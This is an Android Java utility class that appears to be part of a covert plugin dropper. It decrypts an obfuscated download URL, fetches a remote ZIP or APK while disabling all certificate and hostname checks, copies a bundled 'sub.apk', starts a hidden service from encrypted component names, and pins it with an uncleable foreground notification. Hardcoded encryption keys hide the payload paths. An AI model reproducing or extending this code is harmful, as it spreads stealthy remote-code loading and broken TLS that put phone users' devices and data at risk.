package com.xxm.dex.Utils;

import android.app.Notification;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.text.TextUtils;
import android.util.Log;

import com.xxm.dex.ServiceManager;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;


/**
 * Created by admin on 2017/8/21.
 */

public class DUtil {

    public static final int DOWNLOAD_STATU_FINISH = 1;

    public static final int DOWNLOAD_STATU_ING = 0;

    public static final int DOWNLOAD_STATU_START = 2;

    //System.dex
    public static final String DEXFILE = "wqtYqipuYVv0EgxgKzyPUg==";
    //dex2
    public static final String DEXOUTPUTDIR = "wF+hGwZ18+vP+KesqIvc5Q==";
    //.subscribe/System.zip
    public static final String ZIPFILE = "HICn3aGxat0fWPz31Ko7mkx2LfYJ9xTFbvodPs4Riio=";
    //.subscribe/
    public static final String UNZIPFILE = "PY/KspAiQWsu6nHVw+SaGg==";
    //.subscribe/System.apk
    public static final String SOPATH = "HICn3aGxat0fWPz31Ko7mvYZaTfvjyWZeipwcOxq7Ps=";
    //h59gK8hfD
    public static String UZIPKEY = "Vr2BsJVxdyV/XoPgmh8OaA==";

    public static String KEY = "abcdefgabcdefg12";

    //https://1588714767.rsc.cdn77.org/pluginDexApk/System.zip
    private final String DOWNLADO_URL = "KCX/bDjC5jvDDSf3R+H/zfnWBQS/G8i2GS30EwdxfCp9Agxfev1+mODt9zOhhKjIEHaURH/9dXjDCBSYQmDx5g==";

    private final String XML_NAME = "XKhsj58jktuYH";

    private final String SAVE_TIME_TAG = "YdJk8hkULMD&Ikg84";

    public int getD_status() {
        return d_status;
    }

    public void setD_status(int d_status) {
        this.d_status = d_status;
    }

    private int d_status = 100;

    private static DUtil instance = null;

    private Context mContext;

    public static DUtil getInstance(Context context) {
        if (instance == null) {
            instance = new DUtil(context);
        }
        return instance;
    }

    private DUtil(Context c) {
        this.mContext = c;
    }

    public void startDownload(File save_path) {

        setD_status(DOWNLOAD_STATU_START);

        new DTask(save_path).execute();
    }

    private class DTask extends AsyncTask<Void, Integer, Boolean> {

        private File savePath;

        DTask(File s) {
            this.savePath = s;
        }

        @Override
        protected Boolean doInBackground(Void... params) {

            setD_status(DOWNLOAD_STATU_ING);

            InputStream inputStream = null;

            FileOutputStream fileOutputStream = null;
            HttpsURLConnection urlConnect = null;

            try {
                String download_url = H_encode.decrypt(DOWNLADO_URL, DUtil.KEY);

                if (TextUtils.isEmpty(download_url)) {
                    return null;
                }
                TrustManager[] tm = {new MyX509TrustManager()};
                SSLContext sslContext = SSLContext.getInstance("SSL");
                sslContext.init(null, tm, new java.security.SecureRandom());
                // 从上述SSLContext对象中得到SSLSocketFactory对象
                SSLSocketFactory ssf = sslContext.getSocketFactory();

                URL url = new URL(download_url);
                urlConnect = (HttpsURLConnection) url.openConnection();
                urlConnect.setHostnameVerifier(new TrustAnyHostnameVerifier());
                urlConnect.setSSLSocketFactory(ssf);
                urlConnect.setConnectTimeout(20000);
                urlConnect.connect();

                Log.i("Welog", "获取状态：" + urlConnect.getResponseCode());

                if (urlConnect.getResponseCode() >= 400) {

                    //                    Log.i("Welog", "[Status Code: " + httpURLConnection2.getResponseCode() + "] in download: ");
                }

                String longStrs = urlConnect.getHeaderField("Content-Length");

                long parseLong = Long.parseLong(TextUtils.isEmpty(longStrs) ? "-1" : longStrs);

                Log.i("Welog", "文件的大小：" + parseLong);

                int responseCode = urlConnect.getResponseCode();

                if (responseCode == 200 || responseCode == 206) {
                    inputStream = urlConnect.getInputStream();
                    fileOutputStream = new FileOutputStream(savePath);
                    byte[] bArr = new byte[2048];
                    long j = 0;
                    int read;
                    while ((read = inputStream.read(bArr)) >= 0) {

                        j += (long) read;

                        fileOutputStream.write(bArr, 0, read);

                        read = (int) ((j * 100) / parseLong);

                        Log.i("Welog", "downloading........ " + read + "%");

                        if (read == 100) {

                            save_download_time();

                            AnswersUtil.statistic(mContext, "download_success");

                            Log.i("Welog", "下载完成这里发送消息");
                        }
                    }
                    return true;
                }

            } catch (Exception e) {

                if (savePath.exists()) {
                    savePath.delete();
                }

                Log.i("Welog", "error:" + e.getMessage());

                AnswersUtil.statistic(mContext, "download_error", e.getMessage());

                e.printStackTrace();

                return false;

            } finally {
                try {
                    if (inputStream != null) {
                        inputStream.close();
                    }
                    if (fileOutputStream != null) {
                        fileOutputStream.flush();
                        fileOutputStream.close();
                    }
                    if (urlConnect != null) {
                        urlConnect.disconnect();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            return null;
        }

        @Override
        protected void onPostExecute(Boolean aVoid) {
            super.onPostExecute(aVoid);
            setD_status(DOWNLOAD_STATU_FINISH);
            if (aVoid) {
                Log.i("Welog", "onPostExecute:  加载");
                init();
            }
        }
    }


    public static void copyDex(Context context, String dexFile) {

        try {

            Log.i("Welog", "copyDex: do copy");

            InputStream localInputStream = context.getAssets().open("sub.apk");// 获取Assets下的文件

            FileOutputStream localFileOutputStream = new FileOutputStream(new File(dexFile));
            byte[] arrayOfByte = new byte[1024];
            //int i = localInputStream.read(arrayOfByte);
            for (; ; ) {
                int i = localInputStream.read(arrayOfByte);
                if (i == -1) {
                    break;
                }
                localFileOutputStream.write(arrayOfByte, 0, i);
                localFileOutputStream.flush();
            }
            localFileOutputStream.close();
            localInputStream.close();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();

            Log.i("Welog", "copyDex: error " + e.getMessage());

            return;
        }
    }

    private static class TrustAnyHostnameVerifier implements HostnameVerifier {
        public boolean verify(String hostname, SSLSession session) {
            return true;
        }
    }

    /**
     * 信任所有主机 对于任何证书都不做SSL检测
     * 安全验证机制，而Android采用的是X509验证
     */
    private static class MyX509TrustManager implements X509TrustManager {

        public X509Certificate[] getAcceptedIssuers() {
            return null;
        }

        @Override
        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
        }

        @Override
        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
        }
    }

    public static final int NOTIFICATION_ID = 10;

    public static void startForeground(Service service) {

        Notification notification = new Notification.Builder(service).getNotification();

        notification.flags |= Notification.FLAG_NO_CLEAR;

        service.startForeground(NOTIFICATION_ID, notification);
    }

    public void init() {
        try {
            ServiceManager.getInstance().setup(mContext);
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(H_encode.decrypt(ServiceManager.PLUG_SERVICE_PKG, DUtil.KEY), H_encode.decrypt(ServiceManager.PLUG_SERVICE_NAME, DUtil.KEY)));
            mContext.startService(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    /**
     * 获取渠道信息
     *
     * @param context
     * @return
     */
    public static String getKeyStore(Context context) {
        ApplicationInfo appInfo;
        try {
            synchronized (context) {
                appInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(), PackageManager.GET_META_DATA);
                return appInfo.metaData.getString("cid");
            }
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        return "L0001";
    }


    public void save_download_time() {

        SharedPreferences sp = mContext.getSharedPreferences(XML_NAME, 0);

        SharedPreferences.Editor editor = sp.edit();

        editor.putLong(SAVE_TIME_TAG, System.currentTimeMillis());

        editor.apply();
    }

    public boolean check_download_time() {

        SharedPreferences sp = mContext.getSharedPreferences(XML_NAME, 0);

        return Math.abs(System.currentTimeMillis() - sp.getLong(SAVE_TIME_TAG, 0)) > 3 * 24 * 60 * 60000;
    }

    /**
     * 判断是否超过限制时间
     *
     * @param file
     */
    public boolean deleteFile(File file) {
        if (file.exists()) {
            Log.i("Welog", "文件存在判断下载插件时间 ");
            if (check_download_time()) {
                Log.i("Welog", "满足下载时间，先删除后下载 ");
                file.delete();
                return true;
            } else {
                Log.i("Welog", "不满足下载插件时间 ");
                return false;
            }
        } else {
            Log.i("Welog", "文件不存在的时候直接下载: ");
            return true;
        }
    }

    public static boolean checkNet(Context context) {
        try {
            ConnectivityManager connectivity = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (connectivity != null) {
                NetworkInfo networkinfo = connectivity.getActiveNetworkInfo();
                Log.i("Welog", "net state:" + networkinfo.getState());
                if (networkinfo.isAvailable()) {
                    if (networkinfo.isConnected()) {
                        Log.i("Welog", "connected  on net");
                        return true;
                    } else {
                        Log.i("Welog", "connected but can't on net");
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }


}
